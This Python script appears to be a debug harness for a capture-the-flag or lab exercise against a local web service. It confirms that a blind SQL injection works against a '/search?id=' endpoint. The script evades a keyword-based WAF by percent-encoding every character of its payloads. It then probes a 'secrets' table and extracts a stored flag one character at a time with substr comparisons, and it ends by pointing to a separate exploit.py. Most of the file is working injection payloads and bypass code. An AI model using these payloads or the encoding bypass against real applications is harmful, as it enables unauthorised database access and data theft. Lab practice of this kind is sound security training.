#!/usr/bin/env python3
"""
Debug script to test the SQL injection vulnerability step by step
"""

import sys

import requests

BASE_URL = "http://localhost:5050"


def url_encode_full(text):
    """URL encode every character"""
    return "".join([f"%{ord(c):02x}" for c in text])


def test(description, url, expected_text):
    """Run a test"""
    print(f"\n{'=' * 60}")
    print(f"TEST: {description}")
    print(f"{'=' * 60}")
    print(f"URL: {url}")

    try:
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code}")

        # Show relevant part of response
        if "User Found" in response.text:
            print("Result: ✓ User Found")
            result = True
        elif "User Not Found" in response.text:
            print("Result: ✗ User Not Found")
            result = False
        elif "Malicious input detected" in response.text:
            print("Result: 🚫 Blocked by WAF")
            result = False
        else:
            print("Result: Unknown response")
            print(f"Response preview: {response.text[:200]}")
            result = False

        if expected_text:
            if expected_text in response.text:
                print(f"✓ PASS - Found expected text: '{expected_text}'")
                return True
            else:
                print(f"✗ FAIL - Expected '{expected_text}' not found")
                return False

        return result

    except Exception as e:
        print(f"✗ ERROR: {e}")
        return False


print("=" * 60)
print("SQL Injection Debug Test")
print("=" * 60)

# Test 1: Health check
if not test("Health Check", f"{BASE_URL}/health", "OK"):
    print("\n✗ Service is not running!")
    sys.exit(1)

# Test 2: Normal search
test("Normal Search (id=1)", f"{BASE_URL}/search?id=1", "User Found")

# Test 3: Invalid user
test("Invalid User (id=999)", f"{BASE_URL}/search?id=999", "User Not Found")

# Test 4: WAF blocks plaintext SQL
test("WAF Blocks OR", f"{BASE_URL}/search?id=1 OR 1=1", "Malicious input detected")

# Test 5: WAF blocks AND
test("WAF Blocks AND", f"{BASE_URL}/search?id=1 AND 1=1", "Malicious input detected")

# Test 6: Simple encoded test
print("\n" + "=" * 60)
print("TESTING URL ENCODING BYPASS")
print("=" * 60)

# "1 AND 1=1"
payload1 = url_encode_full("1 AND 1=1")
print(f"\nPayload: 1 AND 1=1")
print(f"Encoded: {payload1}")
test("URL Encoded 'AND'", f"{BASE_URL}/search?id={payload1}", "User Found")

# Test 7: Access users table (should work - it's the main query)
payload2 = url_encode_full("1 AND (SELECT 1 FROM users WHERE id=1)=1")
print(f"\nPayload: 1 AND (SELECT 1 FROM users WHERE id=1)=1")
print(f"Encoded: {payload2}")
test("Access users table", f"{BASE_URL}/search?id={payload2}", "User Found")

# Test 8: Access secrets table
payload3 = url_encode_full("1 AND (SELECT 1 FROM secrets LIMIT 1)=1")
print(f"\nPayload: 1 AND (SELECT 1 FROM secrets LIMIT 1)=1")
print(f"Encoded: {payload3}")
test("Access secrets table", f"{BASE_URL}/search?id={payload3}", "User Found")

# Test 9: Check flag exists
payload4 = url_encode_full("1 AND (SELECT 1 FROM secrets WHERE id=1)=1")
print(f"\nPayload: 1 AND (SELECT 1 FROM secrets WHERE id=1)=1")
print(f"Encoded: {payload4}")
test("Flag row exists", f"{BASE_URL}/search?id={payload4}", "User Found")

# Test 10: Extract first character
payload5 = url_encode_full(
    "1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,1,1)='c')=1"
)
print(f"\nPayload: 1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,1,1)='c')=1")
print(f"Encoded: {payload5}")
if test("First char is 'c'", f"{BASE_URL}/search?id={payload5}", "User Found"):
    print("\n✓ Blind SQL Injection is working!")
    print("✓ Flag extraction is possible!")
else:
    print("\n✗ Blind SQL Injection is NOT working")
    print("✗ Check the application logs")

# Test 11: Extract second character
payload6 = url_encode_full(
    "1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,2,1)='e')=1"
)
print(f"\nPayload: 1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,2,1)='e')=1")
print(f"Encoded: {payload6}")
test("Second char is 'e'", f"{BASE_URL}/search?id={payload6}", "User Found")

# Test 12: Wrong character (should fail)
payload7 = url_encode_full(
    "1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,1,1)='x')=1"
)
print(f"\nPayload: 1 AND (SELECT 1 FROM secrets WHERE substr(secret_value,1,1)='x')=1")
print(f"Encoded: {payload7}")
test(
    "First char is 'x' (should be False)",
    f"{BASE_URL}/search?id={payload7}",
    "User Not Found",
)

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print("If all tests passed, the exploit should work!")
print("Run: python3 exploit.py")
